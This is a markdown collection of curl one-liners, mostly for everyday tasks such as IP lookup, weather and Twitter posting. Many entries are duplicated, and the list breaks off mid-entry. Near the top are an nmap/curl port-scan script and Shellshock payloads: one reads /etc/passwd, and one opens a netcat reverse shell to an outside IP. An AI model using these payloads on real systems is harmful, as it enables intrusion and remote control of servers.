# curl 

### curl scan

```sh
#!/bin/bash

if [ $# == 0 ] ; then
    echo "Usage: ./curlScan.sh <IP ADDRESS>"
    exit 1;
fi

echo "Starting Curl Scan"
echo "Scanning for open ports:"
nmap -Pn -sS -T 4 "$1" -p- | grep "^[0-9]" | cut -d "/" -f1 | tee /tmp/portList
echo "Now attempting to retrieve information:"
while read line; do
        echo "Results for $line:"
        timeout 1 curl "$1":"$line"
        if [ $? -eq 124 ]; then
                echo "  "
        fi
done < /tmp/portList

echo "Curl Scan Terminated"
rm /tmp/portList
```


### Shellshock == CVE-2014-6271

#### Classic PoC
```sh
curl -H "User-Agent: () { :; }; /bin/command" http://example.com/
() {:;}; /bin/cat /etc/passwd
```

#### Reverse Shell
```sh
curl -H "User-Agent: () { :;};echo content-type:text/plain;echo;/bin/nc 51.75.29.235 2222 -e /bin/bash;echo;exit" http://vuln.com/script.cgi
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Nice weather forecast on your shell
```sh
curl wttr.in/seville
```

### Nice weather forecast on your shell
```sh
curl wttr.in/seville
```

### print unread gmail message
```sh
curl -su username:passwd https://mail.google.com/mail/feed/atom | xmlstarlet sel -N x="http://purl.org/atom/ns#" -t -m //x:entry -v 'concat(position(), ":", x:title)' -n
```

### Get your external public IP address
```sh
curl icanhazip.com
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Create cookies to log in to website
```sh
curl -L -d "uid=<username>&pwd=<password>" http://www.example.com -c cookies.txt
```

### Geo Temp
```sh
curl -s www.google.com/ig/api?weather=$(curl -s api.hostip.info/get_html.php?ip=$(curl -s icanhazip.com) | sed -e'1d;3d' -e's/C.*: \(.*\)/\1/' -e's/ /%20/g' -e"s/'/%27/g") | sed 's|.*<t.*f data="\([^"]*\)"/>.*|\1\n|'
```

### Conversion of media stream
```sh
curl 'AudioStream' | ffmpeg -i - -acodec libvorbis file.ogg
```

### geoip information
```sh
curl -s ifconfig.me|tee >(xargs geoiplookup)
```

### my ip
```sh
curl ip.appspot.com
```

### Upload documents from linux to MS SHarepoint using curl
```sh
curl ntlm -u <your Active-Directory-Domain>/<your-domain-username> -T /path/to/local/$FILE http://sharepoint.url.com/doc/library/dir/
```

### Extract tarball from internet without local saving
```sh
curl http://example.com/a.gz | tar xz
```

### Download a zipped file and extract it in one line
```sh
curl -Ss https://releases.hashicorp.com/packer/1.0.0/packer_1.0.0_linux_amd64.zip | zcat > packer
```

### Fetch current song from last.fm
```sh
curl -s http://www.last.fm/user/$LASTFMUSER | grep -A 1 subjectCell | sed -e 's#<[^>]*>##g' | head -n2 | tail -n1 | sed 's/^[[:space:]]*//g'
```

### Print all members of US House of Representatives
```sh
curl "http://www.house.gov/house/MemberWWW.shtml" 2>/dev/null | sed -e :a -e 's/<[^>]*>//g;/</N;//ba' | perl -nle 's/^\t\t(.*$)/ $1/ and print;'
```

### External IP address
```sh
curl ifconfig.me
```

### Get your current Public IP
```sh
curl ifconfig.me
```

### Call remote web service
```sh
curl -D - -X POST -H 'Content-type: text/xml' -d @XML http://remote_server:8080/web-service/soap/WSName
```

### Get your external IP address
```sh
curl ifconfig.me/all/xml
```

### Speaks latest tweet by Obama (os x)
```sh
curl "http://api.twitter.com/1/statuses/user_timeline.xml?count=1&screen_name=barackobama" | egrep -w "<text>(.*)</text>" | sed -E "s/<\/?text>//g" | say
```

### Random unsigned integer
```sh
curl -s "https://www.random.org/cgi-bin/randbyte?nbytes=4" | od -DAn
```

### Get a file from SharePoint with cURL
```sh
curl ntlm -u DOMAIN/user https://sharepoint.domain.com/path/to/file
```

### commit message generator - whatthecommit.com
```sh
curl -s http://whatthecommit.com | html2text | sed '$d'
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Display current temperature anywhere in the world in Celcius
```sh
curl -s 'http://www.google.com/ig/api?weather=santa+monica,ca'| sed -ne "s/.*temp_c data..//;s/....humidity data.*//;p" | figlet
```

### Show's the main headline from drudgereport.com
```sh
curl -s http://www.drudgereport.com | sed -n '/<! MAIN HEADLINE>/,/<! Main headlines links END ->/p' | grep -oP "(?<=>)[^<].*[^>](?=<)"
```

### show ip adress public
```sh
curl queip.tk/ip
```

### show how many twitter followers a user has
```sh
curl -s http://twitter.com/users/show.xml?screen_name=username | sed -n 's/\<followers_count\>//p' | sed 's/<[^>]*>//g;/</N;//b'
```

### Grab your bibtex file from CiteULike.
```sh
curl -o <bibliography> "http://www.citeulike.org/bibtex/user/<user>"
```

### External IP (raw data)
```sh
curl curlmyip.com
```

### Get your outgoing IP address
```sh
curl -s ip.appspot.com
```

### Get your external IP address
```sh
curl http://my-ip.cc/host.txt
```

### Get your external IP address
```sh
curl http://my-ip.cc/host.xml
```

### Weather on the Command line
```sh
curl -s "http://www.google.com/ig/api?weather=New%20York" | sed 's|.*<temp_f data="\([^"]*\)"/>.*|\1|'
```

### Get Google PageRank
```sh
curl pagerank.bz/yourdomain.com
```

### Get Google Reader unread count
```sh
curl -s -H "Authorization: GoogleLogin auth=$auth" "http://www.google.com/reader/api/0/unread-count?output=json" | tr '{' '\n' | sed 's/.*"count":\([0-9]*\),".*/\1/' | grep -E ^[0-9]+$ | tr '\n' '+' | sed 's/\(.*\)+/\1\n/' | bc
```

### kalarm 1 per minute simplest e-mail beacom for Geovision surveillance DVR
```sh
curl http://www.spam.la/?f=sender | grep secs| awk '{print; exit}' | osd_cat -i 40 -d 30 -l 2
```

### Update twitter with curl
```sh
curl -u username:password -d status="blah blah blah" https://twitter.com/statuses/update.xml
```

### check your up to date delicious links.
```sh
curl -k https://Username:Password@api.del.icio.us/v1/posts/all?red=api | xml2| \grep '@href' | cut -d\= -f 2- | sort | uniq | linkchecker -r0 stdin complete -v -t 50 -F blacklist
```

### get a list of top 1000 sites from alexa
```sh
curl -s -O http://s3.amazonaws.com/alexa-static/top-1m.csv.zip ; unzip -q -o top-1m.csv.zip top-1m.csv ; head -1000 top-1m.csv | cut -d, -f2 | cut -d/ -f1 > topsites.txt
```

### commit message generator - whatthecommit.com
```sh
curl -s http://whatthecommit.com/ | tr -s '\n' ' ' | grep -so 'p>\(.*\)</p' | sed -n 's/..\(.*\)..../\1/p'
```

### Get external IP address (supports IPv4 and IPv6)
```sh
curl ip.telize.com
```

### commit message generator - whatthecommit.com
```sh
curl -s http://whatthecommit.com | sed -n '/<p>/,/<\/p>/p' | sed '$d' | sed 's/<p>//'
```

### Get your public IP using chisono.it
```sh
curl http://www.chisono.it/ip.asp
```

### Speak your horoscope with the command line
```sh
curl -s 'http://www.trynt.com/astrology-horoscope-api/v2/?m=2&d=23' | xmlstarlet sel -t -m '//horoscope' -v 'horoscope' | festival tts
```

### External IP
```sh
curl www.whatismyip.org
```

### Get your current Public IP
```sh
curl icanhazip.com
```

### where am I in google map?
```sh
curl -s http://geoiplookup.wikimedia.org/ | python3 -c 'import sys, json, string, webbrowser; webbrowser.open(string.Template("http://maps.google.com/maps?q=$lat,$lon").substitute(json.loads(sys.stdin.read().split("=")[-1])))'
```

### html formatting
```sh
curl silent http://exsample.com/ | xmllint html format - | more
```

### Get My Public IP Address
```sh
curl http://whatismyip.org
```

### Get your external IP address
```sh
curl icanhazip.com
```

### Get the weather forecast for the next 24 to 48 for your location.
```sh
curl -s http://api.wunderground.com/auto/wui/geo/ForecastXML/index.xml?query=${@:-<YOURZIPORLOCATION>}|xmlstarlet sel -E utf-8 -t -m //forecast/txt_forecast/forecastday -v fcttext -n
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Update twitter from command line without reveal your password
```sh
curl -n -d status='Hello from cli' https://twitter.com/statuses/update.xml
```

### Search commandlinefu.com from the command line using the API
```sh
curl "http://www.commandlinefu.com/commands/matching/$(echo "$@" | sed 's/ /-/g')/$(echo -n $@ | base64)/plaintext"
```

### Get DELL Warranty Information from support.dell.com
```sh
curl -Ls "http://support.dell.com/support/DPP/Index.aspx?c=us&cs=08W&l=en&s=biz&ServiceTag=$(dmidecode -s system-serial-number)"|egrep -i '>Your Warranty<|>Product Support for'|html2text -style pretty|egrep -v 'Request|View'|perl -pane 's/^(\s+|\})//g;'
```

### Get your current Public IP
```sh
curl -s http://checkrealip.com/ | grep "Current IP Address" | cut -d ' ' -f 4
```

### See where a shortened url takes you before click
```sh
curl -s http://urlxray.com/display.php?url=http://tinyurl.com/demo-xray | grep -o '<title>.*</title>' | sed 's/<title>.*> \(.*\)<\/title>/\1/g'
```

### get you public ip address
```sh
curl ifconfig.me
```

### Get the browser user-agent
```sh
curl sputnick-area.net/ua
```

### Twitter from commandline with curl
```sh
curl basic user username:password data status="Twitter from commandline with curl" https://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl whatismyip.org
```

### Get your external IP address
```sh
curl http://ipecho.net/plain
```

### Oneliner to get domain names list of all existing domain names (from wikipedia)
```sh
curl http://en.m.wikipedia.org/wiki/List_of_Internet_top-level_domains | grep "<tr valign=\"top\">" | awk -F">" '{ print $5 }' | awk -F"<" '{ print $1 }'
```

### What is my public IP-address?
```sh
curl ifconfig.me
```

### Print trending topics on Twitter
```sh
curl -s search.twitter.com | awk -F'</?[^>]+>' '/\/intra\/trend\//{print $2}'
```

### generate random identicon
```sh
curl -s "http://www.gravatar.com/avatar/`uuidgen | md5sum | awk '{print $1}'`?s=64&d=identicon&r=PG" | display
```

### What is my ip?
```sh
curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+'
```

### Random line from bash.org  (funny IRC quotes)
```sh
curl -s http://bash.org/?random1|grep -oE "<p class=\"quote\">.*</p>.*</p>"|grep -oE "<p class=\"qt.*?</p>"|sed -e 's/<\/p>/\n/g' -e 's/<p class=\"qt\">//g' -e 's/<p class=\"qt\">//g'|perl -ne 'use HTML::Entities;print decode_entities($_),"\n"'|head -1
```

### Geo Weather
```sh
curl -s http://www.google.com/ig/api?weather=$(curl -s "http://api.hostip.info/get_html.php?ip=$(curl -s icanhazip.com)" | grep City | sed 's/City: \(.*\)/\1/' | sed 's/ /%20/g' | sed "s/'/%27/g") | sed 's|.*<temp_f data="\([^"]*\)"/>.*|\1\n|'
```

### Update Twitter From the Linux Command Line
```sh
curl -u user:pass -d status=?I am Tweeting from the shell? http://twitter.com/statuses/update.xml
```

### What is my IP address?
```sh
curl whatismyip.org
```

### Checks your unread Gmail from the command line
```sh
curl -u username silent "https://mail.google.com/mail/feed/atom" | perl -ne 'print "\t" if /<name>/; print "$2\n" if /<(title|name)>(.*)<\/\1>/;
```

### What is my ip?
```sh
curl ifconfig.co
```

### What is my ip?
```sh
curl ifconfig.co/all.json
```

### Get your public IP using chisono.it
```sh
curl icanhazip.com
```

### Speak the last 3 tweets on Mac OS
```sh
curl -s -u user:password  http://twitter.com/statuses/friends_timeline.rss | grep title | sed -ne 's/<\/*title>//gp' | head -n 4 | say -v Bruce
```

### download a specific file
```sh
curl -f -O http://pcbsd.fastbull.org/7.0.2/i386/PCBSD7.0.2-x86-DVD.iso
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Extract a remote tarball in the current directory without having to save it locally
```sh
curl http://example.com/foo.tar.gz | tar zxvf -
```

### get you public ip address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### resume download using curl
```sh
curl -C - -o partially_downloaded_file 'www.example.com/path/to/the/file'
```

### Download all Phrack .tar.gzs
```sh
curl http://www.phrack.org/archives/tgz/phrack[1-67].tar.gz -o phrack#1.tar.gz
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Check if your webserver supports gzip compression with curl
```sh
curl -I -H "Accept-Encoding: gzip,deflate" http://example.org
```

### Twit Amarok "now playing" song
```sh
curl -u <user>:<password> -d status="Amarok, now playing: $(dcop amarok default nowPlaying)" http://twitter.com/statuses/update.json
```

### Search Google from the command line
```sh
curl -A Mozilla http://www.google.com/search?q=test |html2text -width 80
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Save xkcd to a pdf with captions
```sh
curl -sL xkcd.com | grep '<img [^>]*/><br/>' | sed -r 's|<img src="(.*)" title="(.*)" alt="(.*)" /><br/>|\1\t\2\t\3|' > /tmp/a; curl -s $(cat /tmp/a | cut -f1) | convert - -gravity south -draw "text 0,0 \"$(cat /tmp/a | cut -f2)\"" pdf:- > xkcd.pdf
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get HTTP status code with curl
```sh
curl write-out %{http_code} silent output /dev/null localhost
```

### Google URL shortener
```sh
curl -s -d'&url=URL' http://goo.gl/api/url | sed -e 's/{"short_url":"//' -e 's/","added_to_history":false}/\n/'
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Update dyndns.org with your external IP.
```sh
curl -v -k -u user:password "https://members.dyndns.org/nic/update?hostname=<your_domain_name_here>&myip=$(curl -s http://checkip.dyndns.org | sed 's/[a-zA-Z<>/ :]//g')&wildcard=NOCHG&mx=NOCHG&backmx=NOCHG"
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Gets a random Futurama quote from /.
```sh
curl -Is slashdot.org | egrep '^X-(F|B|L)' | cut -d \- -f 2
```

### let the cow suggest some commit messages for you
```sh
curl -s http://whatthecommit.com/index.txt | cowsay
```

### Real time satellite wheather wallpaper
```sh
curl http://www.cpa.unicamp.br/imagens/satelite/ult.gif | xli -onroot -fill stdin
```

### Get your public ip
```sh
curl -s ip.appspot.com
```

### Fetch the current human population of Earth
```sh
curl -s http://www.census.gov/popclock/data/population/world | awk -F'[:,]' '{print $7}'
```

### Get Futurama quotations from slashdot.org servers
```sh
curl -Is slashdot.org | sed -n '5p' | sed 's/^X-//'
```

### A command to post a message to Twitter that includes your geo-location and a short URL.
```sh
curl user "USERNAME:PASSWORD" -d status="MESSAGE_GOES_HERE $(curl -s tinyurl.com/api-create.php?url=URL_GOES_HERE) $(curl -s api.hostip.info/get_html.php?ip=$(curl ip.appspot.com))" -d source="cURL" twitter.com/statuses/update.json -o /dev/null
```

### Retrieve top ip threats from http://isc.sans.org/sources.html and add them into iptables output chain.
```sh
curl -s http://isc.sans.org/sources.html|grep "ipinfo.html"|awk -F"ip=" {'print $2'}|awk -F"\"" {'print $1'}|xargs -n1 sudo iptables -A OUTPUT -j DROP -d > 2&>1
```

### Print trending topics on Twitter
```sh
curl silent search.twitter.com | sed -n '/div id=\"hot\"/,/div/p' | awk -F\> '{print $2}' | awk -F\< '{print $1}' | sed '/^$/d'
```

### Get your external IP address
```sh
curl ip.appspot.com
```

### set desktop background to highest-rated image from Reddit /r/wallpapers
```sh
curl http://www.reddit.com/r/wallpapers.rss | grep -Eo 'http:[^&]+jpg' | head -1 | xargs feh bg-seamless
```

### Geolocate a given IP address
```sh
curl ipinfo.io/<ipaddress>
```

### bulk dl files based on a pattern
```sh
curl -O http://hosted.met-art.com/generated_gallery/full/061606AnnaUkrainePasha/met-art-free-sample-00[00-19].jpg
```

### Download and extract a *tar.gz file with curl.
```sh
curl http://domain.com/file.tar.gz | tar zx
```

### Updating the status on identi.ca using curl.
```sh
curl -u USER:PASS -d status="NEW STATUS" http://identi.ca/api/statuses/update.xml
```

### Updates your no-ip.org account with curl
```sh
curl -u $USERNAME:$PASSWORD "http://dynupdate.no-ip.com/nic/update?hostname=$HOSTNAME"
```

### Get your outgoing IP address
```sh
curl -s icanhazip.com
```

### Get Dollar-Euro exchage rate
```sh
curl -s wap.kitco.com/exrate.wml | awk ' BEGIN { x=0; FS = "<" } { if ($0~"^<br/>") {x=0} if (x==1) {print $1} if ($0~"EUR/US") {x=1} }'
```

### Get your Tweets from the command line
```sh
curl -s -u user:password 'http://twitter.com/statuses/friends_timeline.xml?count=5' | xmlstarlet sel -t -m '//status' -v 'user/screen_name' -o ': ' -v 'text' -n
```

### View online pdf documents in cli
```sh
curl 'LINK' | pdftotext - - | less
```

### get you public ip address
```sh
curl http://ifconfig.me/ip
```

### What is My WAN IP?
```sh
curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+'
```

### validate json
```sh
curl -s -X POST http://www.jsonlint.com/ajax/validate -d json="`cat file.js`" -d reformat=no
```

### Twitpic upload and Tweet
```sh
curl form username=from_twitter form password=from_twitter form media=@/path/to/image form-string "message=tweet" http://twitpic.com/api/uploadAndPost
```

### commit message generator - whatthecommit.com
```sh
curl http://whatthecommit.com/index.txt
```

### Display HTTP-header using curl
```sh
curl -I g.cn
```

### Check your unread Gmail from the command line
```sh
curl -u username silent "https://mail.google.com/mail/feed/atom" | awk 'BEGIN{FS="\n";RS="(</entry>\n)?<entry>"}NR!=1{print "\033[1;31m"$9"\033[0;32m ("$10")\033[0m:\t\033[1;33m"$2"\033[0m"}' | sed -e 's,<[^>]*>,,g' | column -t -s $'\t'
```

### Google URL shortener
```sh
curl -s 'http://ggl-shortener.appspot.com/?url='"$1" | sed -e 's/{"short_url":"//' -e 's/"}/\n/g'
```

### Get your outgoing IP address
```sh
curl -s http://whatismyip.org/ | grep -oP '(\d{1,3}\.){3}\d+'
```

### Download files linked in a RSS feed
```sh
curl $1 | grep -E "http.*\.mp3" | sed "s/.*\(http.*\.mp3\).*/\1/" | xargs wget
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### return external ip
```sh
curl ipinfo.io
```

### display ip address
```sh
curl -s http://myip.dk | grep '<title>' | sed -e 's/<[^>]*>//g'
```

### Dump a web page
```sh
curl -s http://google.com | hexdump -C|less
```

### Backup your OpenWRT config (only the config, not the whole system)
```sh
curl -d 'username=root&password=your-good-password' "http://router/cgi-bin/luci/admin/system/backup?backup=kthxbye" > `date +%Y%d%m`_config_backup.tgz
```

### Your GeoIP location on Google Maps
```sh
curl -s http://geoiplookup.wikimedia.org/|awk -F, '{print $3,$4}'|awk -F'"' '{print "http://maps.google.com/maps?q="$4 "," $8}'
```

### What is my public IP address
```sh
curl ifconfig.me
```

### Get your commandlinefu points (upvotes - downvotes)
```sh
curl -s http://www.commandlinefu.com/commands/by/$1/xml | awk -F'</?div[^>]*>' '/class=\"command\"/{gsub(/&quot;/,"\"",$2); gsub(/&lt;/,"<",$2); gsub(/&gt;/,">",$2); gsub(/&amp;/,"\\&",$2); cmd=$2} /class=\"num-votes\"/{printf("%3i  %s\n", $2, cmd)}'
```

### Get your outgoing IP address
```sh
curl icanhazip.com
```

### Update Ping.fm status
```sh
curl -d api_key="$api_key" -d user_app_key="$user_app_key -d body="$body" -d post_method="default" http://api.ping.fm/v1/user.post
```

### Test load balancers
```sh
curl resolve subdomain.example.com:80:10.100.0.1 subdomain.example.com -I -s
```

### Check a server is up. If it isn't mail me.
```sh
curl -fs brandx.jp.sme 2&>1 > /dev/null || echo brandx.jp.sme ping failed | mail -ne -s'Server unavailable' joker@jp.co.uk
```

### send tweets to twitter (and get user details)
```sh
curl basic user "user:pass" data-ascii "status=tweeting%20from%20%the%20linux%20command%20line" http://twitter.com/statuses/update.json
```

### return external ip
```sh
curl ipinfo.io
```

### Quick and dirty RSS
```sh
curl silent "FEED ADDRESS" |sed -e 's/<\/[^>]*>/\n/g' -e 's/<[^>]*>//g
```

### Find the annual salary of any White House staffer.
```sh
curl -s "http://www.socrata.com/api/views/vedg-c5sb/rows.json?search=Axelrod" | grep "data\" :" | awk '{ print $17 }'
```

### Get the header of a website
```sh
curl -sI http://blog.binfalse.de
```

### Random quote from Borat  no html parsing
```sh
curl -s "http://smacie.com/randomizer/borat.txt" | shuf -n 1 -
```

### Get info about a GitHub user
```sh
curl http://github.com/api/v1/yaml/git
```

### Get info about a GitHub project
```sh
curl http://github.com/api/v1/yaml/search/vim
```

### Get http headers for an url
```sh
curl -I www.commandlinefu.com
```

### online MAC address lookup
```sh
curl -s http://www.macvendorlookup.com/getoui.php?mac=$1 | sed -e 's/<[^>]\+>//g'; echo
```

### online MAC address lookup
```sh
curl -s http://standards.ieee.org/regauth/oui/oui.txt | grep $1
```

### Say something out loud
```sh
curl -A "Mozilla" "http://translate.google.com/translate_tts?tl=en&q=$(echo "$@" | sed 's/ /+/g')" | play -t mp3 -
```

### Download a numbered sequence of files
```sh
curl silent -O "http://www.somewebsite.com/imagedir/image_[00-99].jpg"
```

### HTTP Get of a web page via proxy server with login credentials
```sh
curl -U username[:password] -x proxyserverIP:proxyserverPort webpageURI
```

### grab all commandlinefu shell functions into a single file, suitable for sourcing.
```sh
curl -s http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2400:25] | grep -oP "^\w+\(\)\ *{.*}"
```

### import gpg key from the web
```sh
curl -s http://defekt.nl/~jelle/pubkey.asc | gpg import
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Which Twitter user are you?
```sh
curl -s http://twitter.com/username | grep 'id="user_' | grep -o '[0-9]*'
```

### Retrieve the size of a file on a server
```sh
curl -s "$URL" |wc -c
```

### get delicious bookmarks on your shell (text version :-))
```sh
curl -u 'username'   https://api.del.icio.us/v1/posts/all   |  sed 's/^.*href=//g;s/>.*$//g;s/"//g' | awk '{print $1}' | grep 'http'
```

### post data with a http request
```sh
curl -d "a1=v1&a2=v2" url
```

### Get an authorization code from Google
```sh
curl -s https://www.google.com/accounts/ClientLogin -d Email=$email -d Passwd=$password -d service=lh2 | grep Auth | sed 's/Auth=\(.*\)/\1/'
```

### Save all commands from commandlinefu.com to plain text sort by vote
```sh
curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-9000:25] | grep -vE "_curl_|\.com by David" > clf-ALL.txt
```

### Shorten any Url using bit.ly API, using your API Key which enables you to Track Clicks
```sh
curl "http://api.bit.ly/shorten?version=2.0.1&longUrl=<LONG_URL_YOU_WANT_SHORTENED>&login=<YOUR_BITLY_USER_NAME>&apiKey=<YOUR_API_KEY>"
```

### translate what is in the clipboard in english and write it to the terminal
```sh
curl -s "http://ajax.googleapis.com/ajax/services/language/translate?langpair=|en&v=1.0&q=`xsel`" |cut -d \" -f 6
```

### OpenDns IP update via curl
```sh
curl -i -m 60 -k -u user:password 'https://updates.opendns.com/account/ddns.php?'
```

### Twitter update from terminal    (pok3's snipts ?)
```sh
curl -u YourUsername:YourPassword -d status="Your status message go here" http://twitter.com/statuses/update.xml
```

### posts an xml file to a webservice with curl
```sh
curl -X POST -d @request.xml -H 'Content-Type: text/xml' https://hostname/context/service
```

### Get My Public IP Address
```sh
curl -s http://whatismyip.org/
```

### Get your outgoing IP address
```sh
curl -s httpbin.org/ip | jq -r .origin
```

### Displays the current time using HTTP
```sh
curl -Is google.com | grep Date
```

### Fetch the current human population of Earth
```sh
curl -s http://www.census.gov/popclock/data/population/world | jshon -e world -e population -u
```

### Random quote from Borat
```sh
curl -s http://smacie.com/randomizer/borat.html | sed -nE "s# *<td valign=\"top\"><big><big><big><font face=\"Comic Sans MS\">(.*)</font></big></big></big></td>#\1#p"
```

### Scrape commands from commandline fu's 1st page
```sh
curl -s http://www.commandlinefu.com/commands/browse|egrep '("Fin.*and"|<div class="command">.*</div>)'|sed 's/<[^<]*>//g'|ruby -rubygems -pe 'require "cgi"; $_=sprintf("\n\n%-100s\n\t#%-20s",CGI.unescapeHTML($_).chomp.strip, gets.lstrip) if $.%2'
```

### Get DELL Warranty Information from support.dell.com
```sh
curl -sL http://www.dell.com/support/troubleshooting/us/en/555/Servicetag/$(dmidecode -s system-serial-number) | html2text -style pretty | awk -F\. '/with an end date of/ { print $1 "."}'
```

### Get your outgoing IP address
```sh
curl ifconfig.me
```

### Get curenttly playing track in Last.fm radio
```sh
curl -s http://ws.audioscrobbler.com/1.0/user/<user_id>/recenttracks.rss|grep '<title>'|sed -n '2s/ *<\/\?title>//gp'
```

### List the popular module namespaces on CPAN
```sh
curl http://www.cpan.org/modules/01modules.index.html |awk '{print $1}'|grep -v "<"|sort|uniq -c|grep -v " +[0-9] "
```

### Get your public ip using dyndns
```sh
curl -s http://checkip.dyndns.org/ | grep -o "[[:digit:].]\+"
```

### Look up the definition of a word
```sh
curl dict://dict.org/d:something
```

### Gets the english pronunciation of a phrase
```sh
curl -A "Mozilla" "http://translate.google.com/translate_tts?tl=en&q=hello+world" > hello.mp3
```

### Translates a phrase from English to Portuguese
```sh
curl -s -A "Mozilla" "http://translate.google.com.br/translate_a/t?client=t&text=Hi+world&hl=pt-BR&sl=en&tl=pt&multires=1&ssel=0&tsel=0&sc=1" | awk -F'"' '{print $2}'
```

### Get your external IP address
```sh
curl ifconfig.me/all/json
```

### Use curl to save an MP3 stream
```sh
curl -sS -o $outfile -m $showlengthinseconds $streamurl
```

### Follow a new friend on twitter
```sh
curl -u USERNAME:PASSWORD -d "" http://twitter.com/friendships/create/NAMEOFNEWFRIEND.xml?follow=true
```

### Get your external IP address ( 10 characters long )
```sh
curl ip.nu
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Tweet from Terminal to twitter !
```sh
curl -u yourusername:yourpassword -d status=?Your Message Here? https://twitter.com/statuses/update.xml
```

### Find artist and title of a music cd, UPC code given (first result only)
```sh
curl -s 'http://www.discogs.com/search?q=724349691704' | sed -n '\#/release/#{s/^<div>.*>\(.*\)<\/a><\/div>/\1/p}'
```

### Find a CommandlineFu users average command rating
```sh
curl -s www.commandlinefu.com/commands/by/PhillipNordwall | awk -F\> '/num-votes/{S+=$2; I++}END{print S/I}'
```

### Get a file from SharePoint with cURL
```sh
curl ntlm -u DOMAIN/user https://sharepoint.domain.com/path/to/file
```

### Fixes Centos 6.2 yum's metalink certificate errors
```sh
curl http://curl.haxx.se/ca/cacert.pem -o /etc/pki/tls/certs/ca-bundle.crt
```

### Get a facebook likes quantity from CLI
```sh
curl - https://graph.facebook.com/fql?q=SELECT%20like_count,%20total_count,%20share_count,%20click_count,%20comment_count%20FROM%20link_stat%20WHERE%20url%20=%20%27<URL>%27 | awk -F\" '{ print $7 }' | awk -F":" '{ print $2 }' | awk -F"," '{ print $1 }'
```

### Grab the top 5 CLFUContest one-liners
```sh
curl -sL http://goo.gl/3sA3iW | head -16 | tail -14
```

### Update twitter via curl (and also set the "from" bit)
```sh
curl -u twitter-username -d status="Hello World, Twitter!" -d source="cURL" http://twitter.com/statuses/update.xml
```

### Download all Delicious bookmarks
```sh
curl -u username -o bookmarks.xml https://api.del.icio.us/v1/posts/all
```

### a function to find the fastest DNS server
```sh
curl -s http://public-dns.info/nameserver/br.csv| cut -d, -f1 | xargs -i timeout 1 ping -c1 -w 1 {} | grep time | sed -u "s/.* from \([^:]*\).*time=\([^ ]*\).*/\2\t\1/g" | sort -n | head -n1
```

### Get your external IP address if your machine has a DNS entry
```sh
curl www.whatismyip.com/automation/n09230945.asp
```

### Check if the LHC has destroyed the world
```sh
curl -s http://www.hasthelhcdestroyedtheearth.com/ | sed -En '/span/s/.*>(.*)<.*/\1/p'
```

### backup delicious bookmarks
```sh
curl user login:password -o DeliciousBookmarks.xml -O 'https://api.del.icio.us/v1/posts/all'
```

### Use Dell Service Tag $1 to Find Machine Model [Model Name and Model Number]
```sh
curl -s $dellurl$1 | tr "\"" "\n" | grep "</td></tr><tr><td class=" -m 2 | grep -v "Service Tag" | sed 's/>//g' | sed 's/<\/td<\/tr<tr<td class=//g'
```

### Random Futurama quote
```sh
curl -s "http://subfusion.net/cgi-bin/quote.pl?quote=futurama&number=1" |awk '/<body><br><br><b><hr><br>/ {flag=1;next} /<br><br><hr><br>/{flag=0} flag {print}'
```

### Get all files of particular type (say, PDF) listed on some wegpage (say, example.com)
```sh
curl -s http://example.com | grep -o -P "<a.*href.*>" | grep -o "http.*.pdf" |  xargs -d"\n" -n1  wget -c
```

### Download all Red Hat Manuals - A better way by user Flatcap
```sh
curl -s https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/ | grep -o '[^"]*Linux/7/pdf[^"]*' | xargs -I{} wget https://access.redhat.com{}
```

### Oneliner to get domain names list of all existing domain names (from wikipedia)
```sh
curl -s http://en.m.wikipedia.org/wiki/List_of_Internet_top-level_domains | sed -n '/<tr valign="top">/{s/<[^>]*>//g;p}'
```

### Get ElasticSearch configuration and version details
```sh
curl -XGET 'localhost:9200'
```

### Creating shortened URLs from the command line
```sh
curl -s http://tinyurl.com/create.php?url=http://<website.url>/ | sed -n 's/.*\(http:\/\/tinyurl.com\/[a-z0-9][a-z0-9]*\).*/\1/p' | uniq
```

### A command to post a message and an auto-shortened link to Twitter. The link shortening service is provide by TinyURL.
```sh
